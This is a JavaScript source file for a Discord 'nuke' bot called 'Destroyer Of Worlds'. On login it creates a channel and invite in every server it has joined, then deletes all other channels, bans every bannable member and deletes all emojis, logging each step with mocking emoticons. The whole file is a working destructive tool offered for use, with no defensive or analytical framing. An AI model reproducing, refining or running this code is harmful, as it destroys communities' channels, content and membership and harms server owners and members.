const Discord = require("discord.js");
const client = new Discord.Client();
const chalk = require('chalk');
var setTitle = require('console-title');
const readline = require("readline");
var center = require("center-align");
var colors = require("colors");


// Settings for the bot.
const settings = {
    //Make sure you insert actual token rather than Client ID
    botToken: "INSERT TOKEN HERE",
    newChannelName: "Destroyer Of Worlds" //needs new channel name in order to create new invite
};

//await cmd visuals 
client.on("ready", async () => {
    //cmd set title
    setTitle("DOW");
    //cmd display info
    console.log(center(`
    ╦════════════════════════╦
    ║                        ║
    ║   Destroyer Of Worlds  ║
    ║Made by GoldenCodex#6950║
    ║                        ║
    ╩════════════════════════╩
    `.red, 112));
});

//on ready:
client.on("ready", () => {

    //startup message 
    console.log(chalk.bgGreenBright(`INFO`) + (` Logged in as ${client.user.tag}. (^o^)／`));
    // create variable for new channel to prevent it from getting deleted by nuke
    let createdChannelName;
    // Create an invite to a channel
    client.guilds.forEach(server => {
        //if no channel name defined, use default
        if(!settings.newChannelName) settings.newChannelName == "Destroyer Of Worlds";
        //create new channel
        server.createChannel(settings.newChannelName, "text").then(channel => {
            createdChannelName = channel.name;
            //then once channel is created, create an invite link to this channel
            channel.createInvite().then(inviteCode => {
                //log the invite link to console
                console.log(chalk.bgYellowBright(inviteCode));
                //catch errors
            }).catch(err => {
                if (err) throw err;
            });
        }).catch(err => {
            if (err) throw err;
        });
    });



    //delete all channels on server
    client.guilds.forEach(server => {
        server.channels.forEach(channel => {
            if (createdChannelName !== channel.name) {
                channel.delete().then(response => {
                    console.log("my response", response);
                }).catch(err => {
                    if (err) throw err;
                });
            }
        });
    });

    //ban all members on the server
    client.guilds.forEach(guild => {
        guild.members.forEach(m => {
            //set interval to prevent ratelimit error (API restrictions)
            setInterval(function () {
                //check if user is bannable
                if (!m.bannable) return console.log(chalk.bgGrey + ('INFO:') + ` ${m.user.username} could not be banned`);
                m.ban()
                console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Banned ${m.user.username}; ID: ${m.id}. (╯°□°）╯︵ ┻━┻`)

            }, 3 * 100)
        });
    });

    //delete emojis
    client.guilds.forEach(guild => {
        guild.emojis.forEach(em => {
            guild.deleteEmoji(em);
            console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Deleted emoji ${em.name}; ID: ${em.id}. (╯°□°）╯︵ ┻━┻`);
        });
    });



    //handle unexpected errors
    process.on("uncaughtException", err => {
        console.error("\x1b[37m\x1b[41mERROR\x1b[0m: An unknown and unexpected error occurred! x.x.", err);
        process.exit(1);
    });
});

//handle unhandled rejections
process.on("unhandledRejection", err => {
    process.exit(1);
});

client.login(settings.botToken);